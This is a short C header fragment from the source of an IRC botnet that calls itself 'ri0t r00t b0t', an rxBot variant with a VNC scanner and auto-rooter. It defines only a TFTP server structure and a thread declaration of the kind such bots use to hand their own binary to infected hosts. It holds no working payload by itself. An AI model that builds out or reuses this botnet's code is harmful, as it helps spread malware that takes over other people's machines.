/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_TFTPD
typedef struct TFTPD 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	unsigned short port;
	char chan[MAXCHANLEN];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TFTPD;

DWORD WINAPI TftpdThread(LPVOID param);
#endif